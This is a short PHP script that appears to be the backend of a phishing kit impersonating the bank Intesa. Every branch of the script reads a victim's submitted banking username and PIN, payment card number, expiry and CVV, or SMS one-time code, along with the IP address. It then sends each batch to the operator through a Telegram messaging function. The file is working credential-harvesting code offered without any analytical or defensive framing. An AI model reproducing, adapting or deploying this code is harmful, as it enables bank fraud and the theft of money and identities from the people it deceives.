<?
require_once 'app.php';

if($_GET['step'] == 'login') {
    $msg = '+++++++++ Intesa +++++++++'. "\r\n";
    $msg .= '[ USER ] = ' . $_POST['user'] . "\r\n";
    $msg .= '[ PIN ] = ' . $_POST['pin'] . "\r\n";
    $msg .= '[ IP ] = ' . get_user_ip() . "\r\n";
    telegram_message($msg);
}
if($_GET['step'] == 'cc') {
    $msg = '+++++++++ Intesa +++++++++' . "\r\n";
    $msg .= '[ CC ] = ' . $_POST['cc'] . "\r\n";
    $msg .= '[ EXP ] = ' . $_POST['exp'] . "\r\n";
    $msg .= '[ CVV ] = ' . $_POST['cvv'] . "\r\n";
    $msg .= '[ IP ] = ' . get_user_ip() . "\r\n";
    telegram_message($msg);
}
if($_GET['step'] == 'sms') {
    $msg = '+++++++++ Intesa +++++++++' . "\r\n";
    $msg .= '[ SMS ] = ' . $_POST['sms'] . "\r\n";
    $msg .= '[ IP ] = ' . get_user_ip() . "\r\n";
    telegram_message($msg);
}